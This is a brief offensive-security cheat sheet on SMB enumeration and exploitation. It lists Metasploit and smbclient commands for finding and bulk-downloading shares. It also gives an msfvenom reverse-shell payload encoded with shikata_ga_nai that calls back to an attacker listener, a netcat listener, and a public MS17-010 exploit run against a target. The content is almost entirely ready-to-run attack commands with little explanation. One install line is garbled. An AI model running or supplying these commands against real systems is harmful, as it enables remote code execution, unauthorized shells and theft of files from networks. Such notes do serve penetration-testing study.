---
description: Basic SMB Enumeration and Exploitation
---

# SMB

### Check Version with Metasploit

```bash
use auxiliary/scanner/smb/smb_version
```

### smbclient

```bash
smbclient -L 192.168.1.2 --no-pass

# no pass
smbclient //192.168.1.2/public --no-pass

# with creds
smbclient //192.168.1.2/public -U USER%PASS -p PORT

# download all files from shares
smbclient '//10.10.11.174/support-tools' -N -c 'prompt OFF;recurse ON;mget *'

```

### Exploiting MS17-010

```bash
msfvenom -p windows/shell_reverse_tcp -f exe -o asuka.exe \
-a x86 -e x86/shikata_ga_nai LHOST=192.168.100.1 LPORT=31337

# run nc from attacker
nc -lvp 31337

# exploiting the vulnerability
git clone https://github.com/helviojunior/MS17-010
cd MS17-010
python send_and_execute.py target.lab asuka.exe

# In case the dependency is missing
wget https://bootstrap.pypa.io/pip/2.7/get-pip.py
python2 get-pip.py
pip2 install pip install impacket==0.9.22
```
